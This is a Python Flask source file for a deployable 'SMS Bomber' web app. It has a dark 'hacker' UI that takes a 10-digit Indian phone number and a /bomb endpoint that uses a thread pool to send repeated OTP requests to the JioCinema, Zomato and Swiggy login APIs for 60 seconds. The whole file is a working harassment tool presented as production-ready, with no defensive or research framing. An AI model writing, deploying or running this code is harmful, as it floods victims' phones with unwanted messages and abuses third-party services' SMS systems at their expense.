#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
app.py – A production‑ready Flask application using a modular Blueprint
architecture, a dark‑themed hacker UI, and concurrent processing.

Deploy on Render / Heroku / any WSGI server (gunicorn, uWSGI, etc.).

Features
--------
* Modular design – separate blueprints (`home_bp` and `bomber_bp`).
* Professional dark UI rendered with `render_template_string`.
* Concurrency – ThreadPoolExecutor for sending many OTP requests in parallel.
* Error handling – graceful fallbacks and clear messages.
* Deployment ready – `os.environ.get('PORT', 5000)` and gunicorn compatibility.
"""

# ----------------------------------------------------------------------
# Imports
# ----------------------------------------------------------------------
import os
import time
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import (
    Flask,
    Blueprint,
    request,
    jsonify,
    render_template_string,
)

# ----------------------------------------------------------------------
# Configuration (feel free to tweak or load from env vars)
# ----------------------------------------------------------------------
DEFAULT_TARGET_NUMBER   = "9876543210"          # Default 10‑digit Indian number
DELAY_BETWEEN_REQUESTS  = 1.5                   # Seconds between request batches
MAX_THREADS             = 5                     # Parallel requests per batch
TOTAL_ATTACK_DURATION   = 60                    # Seconds to keep bombing

# ----------------------------------------------------------------------
# Blueprint – Home (UI)
# ----------------------------------------------------------------------
home_bp = Blueprint("home", __name__)

# Dark‑themed hacker UI – rendered with render_template_string
HOME_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>SMS Bomber – Dark Hacker UI</title>
    <style>
        body {{
            background-color: #1e1e1e;
            color: #c7d5e0;
            font-family: monospace;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }}
        .container {{
            background-color: #2c2c2c;
            padding: 2rem;
            border-radius: 8px;
            width: 400px;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
        }}
        h1 {{
            color: #00ffcc;
            margin-top: 0;
            font-size: 1.8rem;
        }}
        label, input, button {{
            display: block;
            width: 100%;
            margin-top: 1rem;
        }}
        input {{
            background: #1e1e1e;
            border: 1px solid #444;
            color: #c7d5e0;
            padding: 0.5rem;
            font-size: 1rem;
        }}
        button {{
            background: #00ffcc;
            border: none;
            color: #1e1e1e;
            padding: 0.75rem;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 1rem;
            transition: background 0.3s;
        }}
        button:hover {{ background: #00e6b3; }}
        .message {{ margin-top: 1rem; font-size: 0.9rem; }}
        .error   {{ color: #ff6666; }}
        .success {{ color: #66ff66; }}
    </style>
</head>
<body>
<div class="container">
    <h1>SMS Bomber</h1>
    <form id="bombForm" method="post" action="/bomb">
        <label for="number">Phone Number (10 digits)</label>
        <input type="text" id="number" name="number" placeholder="9876543210"
               pattern="\\d{10}" required>
        <button type="submit">Bomb!</button>
    </form>
    <div id="result" class="message"></div>
</div>
<script>
    const form = document.getElementById('bombForm');
    const resultDiv = document.getElementById('result');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        resultDiv.textContent = 'Bombing in progress…';
        resultDiv.className = 'message';
        const formData = new FormData(form);
        const resp = await fetch('/bomb', {
            method: 'POST',
            body: formData
        });
        const data = await resp.json();
        if (resp.ok) {
            resultDiv.className = 'message success';
            resultDiv.textContent = data.status + '\\nTarget: ' + data.target;
        } else {
            resultDiv.className = 'message error';
            resultDiv.textContent = data.error || 'Unknown error';
        }
    });
</script>
</body>
</html>
"""

@home_bp.route("/", methods=["GET"])
def index():
    """Render the dark hacker UI."""
    return render_template_string(HOME_TEMPLATE)

# ----------------------------------------------------------------------
# Blueprint – SMS Bomber logic
# ----------------------------------------------------------------------
bomber_bp = Blueprint("bomber", __name__)

# Service definitions – adjust URLs / payloads as needed.
SERVICES = [
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/api/v2/auth/request_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"phone": "{}"},
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/user/send_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile_no": "{}"},
    },
]

def _send_otp(service, payload):
    """Internal helper – send a single OTP request."""
    try:
        resp = requests.post(
            service["url"],
            json=payload,
            headers=service["headers"],
            timeout=5,
        )
        if resp.status_code in (200, 201):
            return f"[SUCCESS] {service['name']}"
        if resp.status_code == 429:
            return f"[RATE_LIMIT] {service['name']}"
        return f"[INFO] {service['name']} – {resp.status_code}"
    except Exception as exc:
        return f"[ERROR] {service['name']} – {exc}"

def _build_payload(template, number):
    """Replace placeholder '{}' with the target number."""
    return {k: v.replace("{}", number) if isinstance(v, str) else v
            for k, v in template.items()}

@bomber_bp.route("/bomb", methods=["POST"])
def bomb():
    """Endpoint to trigger the concurrent SMS bombing."""
    try:
        # Accept form data or JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form

        number = data.get("number", DEFAULT_TARGET_NUMBER).strip()

        # Validate 10‑digit number
        if not (number.isdigit() and len(number) == 10):
            return jsonify({"error": "Invalid phone number – must be 10 digits."}), 400

        # Concurrency: ThreadPoolExecutor
        results = []
        start = time.time()

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            # Run until the total duration is reached
            while time.time() - start < TOTAL_ATTACK_DURATION:
                for svc in SERVICES:
                    payload = _build_payload(svc["payload_template"], number)
                    futures.append(executor.submit(_send_otp, svc, payload))
                time.sleep(DELAY_BETWEEN_REQUESTS)

            # Gather results
            for fut in as_completed(futures):
                results.append(fut.result())

        return jsonify(
            {
                "status": "Bombing complete",
                "target": number,
                "duration_sec": int(time.time() - start),
                "responses": results,
            }
        )

    except Exception as exc:
        # Log the exception if needed – omitted for brevity
        return jsonify({"error": f"Unexpected error: {exc}"}), 500

# ----------------------------------------------------------------------
# Flask application factory
# ----------------------------------------------------------------------
def create_app():
    """Create and configure the Flask application."""
    app = Flask(__name__)

    # Register blueprints
    app.register_blueprint(home_bp)
    app.register_blueprint(bomber_bp)

    # Production‑ready: use environment port
    @app.before_request
    def _set_cors():
        # In a real app, set proper CORS / security headers
        pass

    return app

# ----------------------------------------------------------------------
# Entry point
# ----------------------------------------------------------------------
app = create_app()

if __name__ == "__main__":
    # Local dev
    PORT = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=PORT, debug=False)
